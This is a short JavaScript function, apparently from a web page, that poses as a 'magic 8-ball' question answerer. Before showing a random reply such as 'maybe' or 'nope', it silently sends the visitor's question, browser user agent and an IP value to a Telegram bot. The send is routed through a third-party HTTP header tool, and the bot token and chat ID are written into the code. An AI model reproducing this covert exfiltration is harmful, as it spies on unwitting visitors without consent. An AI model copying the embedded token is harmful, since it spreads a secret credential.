function ss(){
  var ua = navigator.userAgent;
  var text = document.getElementById("inp").value;
  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+encodeURIComponent(ua)+"%23"+ipp;
  var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
  var con = "https://api.telegram.org/bot7181515435:AAFNo62gE7hqassHCKmckFsxkz3lvasGtQU/sendMessage?chat_id=-1002666899819&text="+mohtava;
  var data={"UrlBox":con,
"AgentList" : "Google Chrome",
"VersionsList" : "HTTP/1.1",
"MethodList" : "POST"
  }
  $.ajax({
    type: "POST",
    url: url,
    data: data,
    success: function(){
      console.log("ok");
    }
  
})
if(text.length!=0){
  var ans = ["probably not", "probably yes", "maybe", "of course it is", "yep", "nope", "absolutely", "absolutely not"];
  const random = Math.floor(Math.random() * ans.length);
  alert(ans[random]);
  document.getElementById("inp").value="";
}
}
